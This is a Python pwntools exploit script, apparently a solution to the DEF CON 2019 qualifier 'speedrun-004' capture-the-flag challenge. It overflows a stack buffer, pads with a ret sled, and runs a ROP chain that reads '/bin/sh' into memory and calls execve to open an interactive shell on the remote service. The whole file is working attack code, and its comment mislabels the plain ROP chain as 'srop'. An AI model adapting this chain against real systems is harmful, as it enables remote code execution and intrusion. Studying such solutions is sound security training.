from pwn import *

conn = remote("speedrun-004.quals2019.oooverflow.io", 31337)

def trigger_bof(payload):
	conn.recvuntil("how much do you have to say?")
	conn.sendline("257")
	conn.recvuntil("Ok, what do you have to say for yourself?")
	conn.send(payload)

syscall_ret = 0x00474f15
pop_rdi = 0x0048fc8d
pop_rsi = 0x0041354f
pop_rdx = 0x0044c6b6
pop_rax = 0x00415f04
ret = 0x400C45
bss = 0x006bc000 - 0x100

# rop chain, srop
rop_chain  = p64(pop_rdi)		
rop_chain += p64(0)			# fd : 0 
rop_chain += p64(pop_rsi)		
rop_chain += p64(bss)		# *buf : bss
rop_chain += p64(pop_rdx)		
rop_chain += p64(8)			# size : 8
rop_chain += p64(pop_rax)
rop_chain += p64(0)
rop_chain += p64(syscall_ret)
rop_chain += p64(pop_rdi)		
rop_chain += p64(bss)		
rop_chain += p64(pop_rsi)		
rop_chain += p64(0)			
rop_chain += p64(pop_rdx)		
rop_chain += p64(0)			
rop_chain += p64(pop_rax)
rop_chain += p64(59)
rop_chain += p64(syscall_ret)

print(len(rop_chain))

# fake ebp -> ret sled -> srop
payload = p64(ret)*(32-(len(rop_chain)/8))
payload += rop_chain
payload += "\x00"

trigger_bof(payload)

# get shell
conn.send("/bin/sh\x00")

conn.interactive()